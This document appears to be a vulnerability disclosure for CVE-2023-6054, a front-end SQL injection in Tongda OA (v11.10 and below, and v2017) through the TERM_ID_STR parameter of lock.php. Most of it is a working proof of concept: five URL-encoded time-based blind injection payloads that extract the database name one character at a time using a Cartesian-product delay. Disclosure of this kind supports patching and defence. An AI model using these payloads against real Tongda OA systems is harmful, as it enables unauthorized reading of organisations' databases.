# CVE-2023-6054
Tongda OA has a front-end SQL injection vulnerability

version:v11.10 and below versions and v2017 version

Route: general/wiki/cp/manage/lock.php

There is an injected parameter: $TERM_ID_STR

The code here is very simple. When $TYPE==LOCK or UNLOCK, the parameter $TERM_ID_STR is directly connected to the SQL statement to cause SQL injection.
![image](https://github.com/TinkAnet/cve/assets/118334129/ccb82304-9491-4109-b25a-e67ef2d0c782)


2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/TinkAnet/cve/assets/118334129/3d63ff4e-e1e8-42dc-a2e4-cb9281ec66ff)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

```1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```

![image](https://github.com/TinkAnet/cve/assets/118334129/d6d8ab14-ca96-4250-b285-347289be9295)

The third digit is the character _
```1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```

![image](https://github.com/TinkAnet/cve/assets/118334129/e217d24a-ff2a-4720-80b6-75a9f8107ffb)

The fourth digit is the character o

```1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```
![image](https://github.com/TinkAnet/cve/assets/118334129/b84f40ae-8d23-4fce-8778-404924076544)

The fifth digit is the character a

```1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```
![image](https://github.com/TinkAnet/cve/assets/118334129/499745c3-077a-4709-86ea-7b8c9e8968f5)

